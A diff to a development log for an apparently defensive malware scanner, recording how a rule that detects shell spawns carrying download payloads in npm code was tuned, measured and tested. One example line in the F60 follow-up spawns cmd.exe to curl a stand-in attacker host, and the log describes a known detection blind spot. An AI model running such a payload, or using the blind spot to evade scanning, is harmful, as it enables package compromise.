@@ -2957,7 +2957,7 @@ each is a separate rule family with its own calibration burden. Ranked by severi
 
 ## Open follow-ups (surfaced by the F43 formatted-argv pass, not yet worked)
 
-- F58. [ ] **A formatted argv that assigns before it downloads is still
+- F58. [x] **A formatted argv that assigns before it downloads is still
   invisible** — branch 2 excludes `=` and `;` so that it cannot walk into the
   next statement, and the price is exact: a payload whose argv *contains* one of
   them before the payload token is missed when the call is split over lines.
@@ -2970,6 +2970,56 @@ each is a separate rule family with its own calibration burden. Ranked by severi
   while inside an unclosed `[`, which regex cannot express and a two-pass
   bracket scan can. Worth deciding whether that scan belongs here at all before
   building it.
+  **Done — the scan belongs here, and the argument for it is that it is a
+  TIGHTER bound than the regex, not a looser one.** The decision the task asked
+  for went this way because the alternative readings both fail: a wider
+  character class is wrong (`=` genuinely does end the reach in flat text), and
+  leaving it is wrong for a reason F43 already accepted — the same call reads
+  differently depending only on whether prettier touched it, which is the exact
+  asymmetry F43 existed to remove, surviving inside its own class. What the
+  regex cannot say is that an `=` *inside the call's parentheses* is not a new
+  statement while one outside them always is. That is a bracket depth.
+  `_shell_argv_carries_a_payload()` reads it: from the shell binary forward with
+  a depth counter that starts inside the call's own `(` and stops at the `)`
+  that closes it, so it **cannot reach another statement at all** — where branch
+  1 may still read 200 characters of whatever follows a call that ended
+  mid-line. Two budgets backstop a call that never closes: the same
+  `SHELL_ARGV_LINES` = 6 the regex uses, and `SHELL_COMMAND_WINDOW * 7` bytes.
+  Quotes are deliberately not tracked — a `)` inside a string literal ends the
+  span early, which can only *lose* a hit, and tracking them would mean a JS
+  tokenizer for a check whose whole job is to be cheaper than one.
+  **It supplements the pattern instead of replacing it.** `MalwarePattern`
+  gained an optional `structural` reader for the same description, consulted
+  only when the regex missed. So the calibrated regex is untouched byte for
+  byte — every F38/F43 measurement behind it still holds — this can only ADD
+  hits, and a file the regex already flags pays nothing extra.
+  **Measured old-vs-new over 2,826 installed packages / 72,949 code files
+  (4,950 reaching the scan after an `exec|spawn` byte prefilter and a 2 MB size
+  cap): 0 old hits, 0 new hits, 0 added.** That the scan is genuinely exercised
+  rather than trivially empty is its own measurement: over 1,250 of those
+  packages the anchor fires on **3 real call sites**, and **1 of the 3 carries a
+  `=` or `;` inside its own argv** — the exact class this opens — and is still
+  clean, because the payload class is what carries the weight and is unchanged.
+  The sweep was bounded (a wall-clock budget, a size cap) for the reason F59
+  exists; it is stated, not papered over.
+  **Throughput: +0.51s over 19.1 MB of real bundles** (this rule 0.72s -> 1.23s,
+  full table 8.81s), i.e. the scan costs one more `_PROCESS_CALL`-prefixed pass
+  — the same price the pattern it backs up already pays. Two orderings were
+  measured rather than assumed: gating on the payload tokens FIRST is 5.5x
+  worse (4.01s alone), so the anchor stays the outer filter. The anchor's own
+  call-name alternation is spelled with its shared prefixes factored out
+  (0.69s -> 0.49s, identical verdict on every corpus file); `_PROCESS_CALL`
+  itself is left alone because re-spelling it changes the shipped rule.
+  **17 new test cases** — the task's shape verbatim plus a POSIX and an encoded
+  PowerShell twin, formatted/one-line agreement, 6 negatives (a build step whose
+  argv really does contain `NODE_ENV=…`, and every 2,080-package false danger
+  re-asserted *through the structural reader*, which is what runs on them since
+  the regex misses), both budgets, an only-runs-where-the-regex-missed guard,
+  and a 10-case anti-drift lock that the factored prefix accepts exactly the six
+  call names and no more (`execa`, `respawn`). Full suite **3,788 passed /
+  2 skipped** (was 3,764); ruff + mypy gates clean; no doc drift (the row is not
+  named in RULES.md/THREAT_MODEL.md).
+  _(commit PENDING)_
 
 - F59. [ ] **The corpus sweep this repo keeps citing cannot actually be run on
   this machine** — F43 needed the 2,080-package re-measurement F38 established
@@ -3184,3 +3234,40 @@ webhook/paste exfil, server-authoritative licensing, CLI menu/README agent-scan 
   corpus, and it is the claim that rules out grouping the summary. Re-run
   `measure_f42_full.py` over the full tree list as a background pass and either
   confirm the number or re-open the grouping question with the real one.
+
+## Open follow-ups (surfaced by the F58 argv-bracket pass, not yet worked)
+
+- F60. [ ] **An unmatched `)` inside a string literal ends the argv span early**
+  — `_call_argument_span` counts brackets without tokenising strings, which is
+  the declared trade (a JS tokenizer is more machinery than the check itself is
+  worth, and under-reading can only lose a hit, never invent one). The residual
+  is measured and narrow: `spawn("cmd.exe",\n  "/c echo ) ; u=x & curl http://evil.tld/a"\n);`
+  yields no `shell process spawned`, while the identical call on one line does
+  — the same formatted-vs-one-line asymmetry F58 closed, in a corner F58 does
+  not reach, because the stray `)` returns the depth counter to 0 before the
+  payload. It needs an *unmatched* `)` with no `[` or `(` open before it, which
+  is why the ordinary `["/c", "echo (done) ; curl …"]` spelling is unaffected
+  (both verified). Whether this is worth closing is a real question and the
+  answer may be no: the cheap fix is to skip over `'…'`/`"…"` runs (not template
+  literals, not escapes, not regex literals) inside the span scan, which handles
+  this case and re-opens the "how much of a parser lives here" question F58
+  deliberately closed. Measure how often an unmatched `)` appears inside a real
+  spawn argv before building anything — if the answer is "never outside a
+  fixture", pin the miss as a decision the way F39's reverse phrasing is pinned
+  and stop.
+
+- F61. [ ] **`_PROCESS_CALL` can be spelled the fast way too, and the shipped
+  rule would get it for free** — F58 needed its own anchor, measured the flat
+  six-way alternation against one with the shared `exec`/`spawn` prefixes
+  factored out, and got **0.69s -> 0.49s over 19.1 MB of real bundles for an
+  identical verdict on every file**. `_PROCESS_CALL` is still the flat spelling
+  and is the prefix of the shipped `shell process spawned` pattern, which costs
+  0.72s over the same corpus — so the same factoring is plausibly worth ~0.2s of
+  it, on a rule that runs against every scanned file. It was left alone on
+  purpose: re-spelling the calibrated pattern is a change to the shipped rule,
+  not to F58's new one, and belongs in a pass that re-measures the rule rather
+  than riding along with a different task. The languages are provably identical
+  (a 10-case anti-drift test already asserts the two prefixes accept exactly
+  `exec`/`execSync`/`execFile`/`execFileSync`/`spawn`/`spawnSync` and reject
+  `execa`/`respawn`), so hit counts cannot move and the measurement to re-run is
+  purely throughput. If it lands, the two constants should collapse into one.
